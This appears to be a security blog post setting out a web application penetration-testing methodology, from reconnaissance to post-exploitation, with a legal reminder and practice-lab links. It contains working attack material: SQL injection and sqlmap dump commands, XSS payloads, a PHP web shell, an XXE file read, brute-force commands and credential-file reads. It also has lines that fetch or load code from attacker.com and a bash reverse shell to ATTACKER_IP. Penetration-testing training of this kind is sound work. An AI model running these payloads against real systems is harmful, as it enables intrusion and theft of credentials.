---
title: "Web Application Security Assessment Methodology"
description: >-
  A structured and repeatable workflow for assessing modern web applications.
  Focused on attack surface mapping, business logic validation, and controlled
  exploitation rather than tool-driven scanning.
author:
name:
date: 2025-03-10 18:00:00 +0000
categories: [Offensive]
tags: [web, appsec, xss, sqli, rce, recon, bugbounty, security-testing]
image:
  path: /assets/posts/web-app-testing.png
---

Modern web security assessments are rarely won with payload lists or automated scanners.

Most high-impact findings come from:

- broken trust boundaries  
- weak authorization logic  
- exposed internal functionality  
- operational misconfigurations  

Tools assist.  
Methodology determines success.

This is the structured workflow I use during professional engagements.

> “The surface is just HTML. The real vulnerabilities hide behind logic, endpoints, and trust.”
{: .prompt-info }

## Assessment Philosophy

During professional engagements, prioritize:

- Attack surface reduction before exploitation
- Manual logic analysis before automation
- Impact demonstration over proof-of-concept noise
- Reproducibility and clear reporting

Tools execute tests.  
Reasoning finds vulnerabilities.

---

## 1. Web Reconnaissance

### Subdomain & Directory Hunting
```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://target.com/FUZZ -mc all -ac
feroxbuster -u https://target.com
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u > crtsh-subs.txt
```

### Tech Fingerprinting
```bash
curl -sI "https://target.com" | grep -i "server\|powered"
whatweb https://target.com
nmap -sV -p 80,443 target.com
```

> Look for forgotten admin panels, hidden APIs, staging servers, or unused subdomains that could be entry points.
{: .prompt-tip }

### Web Server and Firewall Fingerprinting
```bash
wafw00f https://example.com
nmap -p 80,443 --script http-enum target.com
```

---

## 2. Analyze Request/Response Flow

Use **Burp Suite** or **ZAP** to:
- Intercept all HTTP traffic
- Analyze parameters, cookies, headers
- Identify auth flows, tokens, session handling

> *Check for insecure direct object references (IDOR), CSRF, broken access control, and token leakage.*
{: .prompt-warning }

### Analyzing Cookies and Session Management
```bash
curl -I -X GET https://target.com/login | grep "Set-Cookie"
```

Check for:
- Cookie flags (`HttpOnly`, `Secure`, `SameSite`)
- Session fixation or weak session management

---

## 3. Input-Based Attacks

### SQL Injection
```sql
' OR 1=1-- -
```
```bash
sqlmap -u "https://target.com/product?id=3" --dbs --level=5 --risk=3
sqlmap -u "https://target.com/index.php?user=admin&pass=' OR 1=1 --" --dump
```

> **Advanced SQLi Commands**:
```bash
sqlmap -u "https://target.com/item?id=1" --union-cols=10 --union-char=1 --batch --dbs
```

### XSS (Reflected / Stored)
```html
"><script>alert('XSS')</script>
```

> **Advanced XSS**: Test for stored XSS in profile, comment, and feedback forms.
```html
<script>alert(document.cookie)</script>
```

### Command Injection
```bash
127.0.0.1; whoami
curl -X GET "https://target.com/?id=$(curl attacker.com/reverse-shell.sh)"
```

---

## 4. Authentication Bypass & Bruteforce

### Brute POST Logins
```bash
hydra -l admin -P rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
```

Check for:
- Default creds (`admin:admin`)
- No rate limiting
- Leaked password reset endpoints

### OTP Bypass (Token Brute Force)
```bash
hydra -l admin -P otp_list.txt target.com http-post-form "/login:username=^USER^&password=^PASS^&otp=^OTP^:Invalid login"
```

### Bypassing CAPTCHA
```bash
gocr -c 0 -i captcha.png > captcha_output.txt
```

---

## 5. Exploit Misconfigurations

### File Upload → RCE
```php
<?php system($_GET['cmd']); ?>
```

Upload and access:
```
/uploads/shell.php?cmd=id
```

### Exposed Git repo
```bash
curl target.com/.git/config
```

Then use:
```bash
git-dumper https://target.com/.git/ dumped-site/
```

### SSTI / XXE / SSRF
Test payloads in templates, XML parsers, and image URLs:
```xml
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

### Exploiting API Endpoints (API Rate Limiting)
```bash
curl -X GET https://target.com/api/v1/products --header "Authorization: Bearer YOUR_TOKEN"
```

Check for:
- Rate limiting bypass via multiple tokens or IP addresses

---

## 6. Advanced Tricks

- JWT token cracking: try `john`, `jwt_tool`, weak secrets
```bash
jwt_tool -t token.jwt
```

- Deserialization: look for serialized objects in cookies or POST
```bash
echo "serialized_object" | python -c 'import pickle; print(pickle.loads(input()))'
```

- CSP bypass → steal sessions with clever XSS
```html
<script src="https://attacker.com/malicious.js"></script>
```

---

## 7. Post-Exploitation

Once you get RCE or access:
- Enumerate server (whoami, uname -a, netstat -tunlp)
```bash
whoami
uname -a
netstat -tunlp
```

- Dump `.env`, config files, DB creds
```bash
cat /var/www/.env
cat /var/www/config.php
```

- Pivot into internal admin panels
- Upload web shells or reverse shells (use `weevely`, `nishang`, `php-reverse-shell`)
```bash
weevely generate shell.php password
```
- Use reverse shell techniques:
```bash
nc -lvnp 4444
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## 8. Exploiting Server Misconfigurations

### Nginx / Apache Configs
```bash
cat /etc/nginx/nginx.conf
cat /etc/apache2/sites-available/000-default.conf
```

Look for:
- Misconfigured `Server` headers
- Exposed sensitive paths

### Docker and Kubernetes Misconfigurations
```bash
docker exec -it container_name bash
```

Look for:
- Exposed Docker APIs
- Vulnerabilities in running containers

---

## Tools You’ll Want

| Tool         | Use Case                        |
|--------------|----------------------------------|
| `Burp Suite` | Intercept, test, automate        |
| `sqlmap`     | SQL injection + DB takeover      |
| `ffuf`       | Fuzzing parameters/directories   |
| `wpscan`     | WordPress vulnerability scanning |
| `jwt_tool`   | JWT analysis + cracking          |
| `gf`, `nuclei` | Pattern + vuln scanning        |
| `git-dumper` | Dump exposed git repositories    |
| `dirsearch`  | Directory brute-forcing          |
| `hydra`      | Brute force various services     |
| `gocr`       | CAPTCHA cracking                 |
| `weevely`    | Web shell management             |

---

## Legal Reminder

> Authorized pentests only. Targeting random websites is illegal, stay ethical.
{: .prompt-warning }

---

## Attack Flow Summary

1. Recon (subdomains, dirs, tech stack)
2. Analyze HTTP logic (auth, roles, sessions)
3. Inject payloads (XSS, SQLi, LFI, RCE)
4. Abuse logic flaws & misconfig
5. Post-exploitation & lateral access

---

## Next Steps / Labs

- **Hack The Box** labs
- **OWASP Juice Shop**
- **Damn Vulnerable Web Application (DVWA)**
- Public programs via **HackerOne** or **Bugcrowd**

> **`“The best payload isn’t in a list. It’s in your head.”`**
{: .filepath }
